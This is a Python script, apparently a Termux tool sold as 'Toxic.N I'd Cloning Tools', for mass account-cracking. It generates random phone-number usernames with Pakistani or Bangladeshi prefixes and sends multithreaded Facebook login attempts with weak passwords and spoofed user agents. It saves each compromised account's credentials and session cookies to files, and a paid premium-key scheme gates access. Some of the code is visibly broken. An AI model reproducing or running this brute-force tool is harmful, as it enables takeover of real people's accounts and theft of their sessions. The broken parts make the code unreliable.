#--------------[import module]--------------# 
import os
import sys
import time
import requests
import uuid
os.system('clear')
def o():
    os.system('clear')
    print(logo)
    ip = requests.get("https://api.ipify.org").text
    jalan("  ║ \033[97;1m[\033[38;5;46m+\033[97;1m] \033[97;1mIP ADDRES \033[38;5;196m: \033[38;5;46m"+ip)
    jalan("  \033[97;1m║ \033[97;1m[\033[38;5;46m1\033[97;1m] \033[97;1mSTART RANDOM CLONING   ")
    print("  ║ \033[97;1m[\033[38;5;46m2\033[97;1m] \033[97;1mCONTACT ADMIN")
    print("  ║ \033[97;1m[\033[38;5;46m3\033[97;1m] \033[97;1mJOIN MY GROUP ")
    ToxicN = input('  ║ \033[97;1m[\033[38;5;46m?\033[97;1m] \033[97;1mSelect menu \033[38;5;196m: ')
    if ToxicN == '1':
        i()
    if ToxicN == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100086610993116')
    if ToxicN == '3':
        os.system('xdg-open https://facebook.com/groups/2791954394284501/')
    if ToxicN == 'E':
        os.system('exit')
        return None
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)

def back():
	login()
ToxicN="ToxicN"
imt="SETU"
ak="CLASS3-"
myid=uuid.uuid4().hex[:8].upper()
try:
	key1 = open('/storage/emulated/0/android8.txt', 'r').read()
except:
	kok=open('/storage/emulated/0/android8.txt', 'w')
	kok.write(myid+imt)
	kok.close()
#------------[Colour]-------------#
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
GREEN = '\033[38;5;46m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
bi = random.choice([M,N,K,B,U])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo=("""

\x1b[97;1m   ████████  ██████  ██   ██ ██  ██████    ███    ██ 
\x1b[97;1m      ██    ██    ██  ██ ██  ██ ██         ████   ██ 
\x1b[97;1m      ██    ██    ██   ███   ██ ██         ██ ██  ██ 
\x1b[97;1m      ██    ██    ██  ██ ██  ██ ██         ██  ██ ██ 
\x1b[97;1m      ██     ██████  ██   ██ ██  ██████ \033[38;5;196m██ \x1b[97;1m██   ████ 

\x1b[97;1m  ╔═══════════════════════════════════════════════════╗
\x1b[97;1m  ║      [\033[38;5;196m+\x1b[97;1m] \x1b[97;1mToxic.N I'd Cloning Tools\x1b[97;1m  [\033[38;5;196m+\x1b[97;1m]           ║
\x1b[97;1m  ╠═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╣
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mName     : \x1b[97;1mToxic.N I'd Cloning Tools          \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mGithub   : \x1b[97;1mhttps://github.com/Toxic-N-404     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mWhatsapp : \x1b[97;1m+88016********                     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mVersion  : \x1b[97;1m1.2.0\x1b[1;94m	                      \x1b[97;1m║
\x1b[97;1m  ╠═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╝""")
try:
    print("\033[38;5;46m\nTOOL UPDATE SUCCESSFUL\n")
    time.sleep(2)
    ToxicN()
    print("\033[38;5;196m\nYOUR DEVICE IS NOT SUPPORTED!\n")
    ToxicN()
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[38;5;196mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033[0;92m')


loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[38;5;196mNo internet connection ... \033[0;97m')
#--------------[global functions]--------------#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#-------------[User agents]------------#
ugen2=[]
ugen=[]

for xd in range(98605):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print("  ║      \033[38;5;46m8 DIGIT \033[97;1mCLONING \033[97;1m[\033[38;5;46mENJOY\033[97;1m]")
    print("  ╠\033[0m═══════════════════════════════════════════════════╗")
    print("  ║ \033[97;1m[\033[38;5;46m•\033[97;1m]\033[1;97mPK CODE    \033[38;5;196m:\033[1;97m 92301 92302 92303 92305           ║ ")
    print("  ║ \033[97;1m[\033[38;5;46m•\033[97;1m]\033[1;97mBD CODE    \033[38;5;196m:\033[1;97m 88016 88017 88018 88019           ║ ")
    print("  ╠\033[0m═══════════════════════════════════════════════════╝ ")
    code = input("  ║ \033[0mINPUT CODE \033[1;97m: ")
    print("")
    os.system('clear')
    print(logo)
    print("  ║          \033[1;97m[\033[1;33mL I M I T  M E N U \033[1;97m]")
    print("  ╠\033[0m═══════════════════════════════════════════════════╗ ")
    print("  ║ \033[97;1m[\033[38;5;46m+\033[97;1m] \033[1;97mEXAMPLE      \033[38;5;196m: \033[38;5;46m10000\033[1;97m , \033[38;5;46m20000\033[1;97m , \033[38;5;46m30000          \033[97;1m║ ")
    limit = int(input("  ║ \033[97;1m[\033[38;5;46m?\033[97;1m] \033[1;97mCRACK ID LIMIT \033[38;5;196m: \033[38;5;46m"))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as setu:
        clear()
        tl = str(len(user))
        jalan("  ║ \033[97;1m[\033[38;5;46m+\033[97;1m] \033[38;5;46mAGENTS    \033[38;5;196m: \033[38;5;46m"+str(len(ugen)))
        jalan("  \033[97;1m║ \033[97;1m[\033[38;5;46m+\033[97;1m] \033[38;5;46mSIM CODE  \033[38;5;196m: \033[38;5;46m"+code)
        jalan("  \033[97;1m║ \033[97;1m[\033[38;5;46m+\033[97;1m] \033[38;5;46mCRACK ID  \033[38;5;196m: \033[38;5;46m"+tl)
        print("  \033[97;1m║ \033[97;1m[\033[38;5;46m+\033[97;1m] \033[38;5;46mFILE SAVE \033[38;5;196m: \033[38;5;46mToxicN-OK.txt")
        print("  \033[97;1m║ \033[97;1m[\033[38;5;46m+\033[97;1m] \033[38;5;196mFILE SAVE \033[38;5;196m: \033[38;5;196mToxicN-CP.txt")
        print("\033[97;1m  ╠\033[0m═══════════════════════════════════════════════════╗ ")
        jalan("  ║ \033[97;1m[\033[38;5;46m✓\033[97;1m] \033[1;97mWIFI IS BEST FOR THIS TOOL    		      ║ ")
        jalan("  ║ \033[97;1m[\033[38;5;46m✓\033[97;1m] \033[1;97mMIX IDZ CLONING ENJOY DEAR USER               ║ ")
        print("  ╚\033[0m═══════════════════════════════════════════════════╝ ")
        for toxic in user:
            pwx = [toxic,'###@@@','@@@###','123@@@','123###','bangladesh','i love you','Bangladesh','free fire','Free fire','I love you',]
            uid = code+toxic
            setu.submit(rcrack,uid,pwx,tl)
    print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://developer.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'developer.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'x-fb-rlafr': '0',
            'access-control-allow-origin': '*',
            'facebook-api-version': 'v16.0',
            'strict-transport-security': 'max-age=15552000',
            'pragma': 'no-cache',
            'cache-control': 'private, no-cache, no-store, must-revalidate',
            'x-fb-request-id': 'AVkvp5xaRmJlvLSVh6yZcZO',
            'x-fb-trace-id': 'ECKbEwu+6l/',
            'x-fb-rev': '1007202889',
            'x-fb-debug': '38MdzEKtayv2w3Tf2jKDeBqx0OuKSOW/XE2RLHVCyttv36RP9rNVPsp3nIGRjfGpzl9PnzoM8QEZfZq45nM3Yw==',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AffNHiEkem8kLgwWBIW3EFsu0vpg8RpRucM-p4NArG2I4LkBRWRd2GIJQ20-jmC9DxOZCAsAnG5MBoQ50ID8tvOP8QKWbPNraeqicU3CML1sqg&smuh=52779&lh=Ac8j6v9a_PfzQcLalAQ&refid=7&ref_component=mbasic_footer&_rdr',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://developer.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;46m[Toxic-OK][🔥] ' +uid+ '|' +ps+    '  \n   \033[38;5;46m[🍪]COOKIES : \x1b[97;1m'+coki+ ' ')
                open('/sdcard/Toxix.N-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;196m[Toxic.N-CP][😭] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/Toxic.N-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r    \33[1;93m[\033[0m%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass


def Subscraption():
	key1=open('/storage/emulated/0/android8.txt', 'r').read()
	r1=requests.get("https://github.com/Toxic-N-404/TX-N/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		o()
	else:
		os.system("clear")
		print(logo)
		print("    \033[97;1m[\033[38;5;46m•\033[97;1m]\33[0;92mYOUR ARE NOT A PREMIUM USER")
		time.sleep(0.0009)
		print("    \033[97;1m[\033[38;5;46m•\033[97;1m]\33[0;92mPREMIUM TOPUP LIST")
		print("    \033[97;1m[\033[38;5;46m•\033[97;1m]\33[0;92m7 DAYS 200 TAKA")
		print("    \033[97;1m[\033[38;5;46m•\033[97;1m]\33[0;92m15 DAYS 400 TAKA")
		print("    \033[97;1m[\033[38;5;46m•\033[97;1m]\33[0;92mYour Key  :\033[1;94m "+ak+ToxicN+key1)
		name = input("    \033[97;1m[\033[38;5;46m•\033[97;1m]\33[0;92mYour Name : ")
		input("    \033[97;1m[\033[3cps;46m•\033[97;1m]\33[0;92mPress Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ToxicN+''+key1
		os.system('am start https://wa.me/+8801622572704?text=' + tks)
		Subscraption() 
#Subscraption()
o()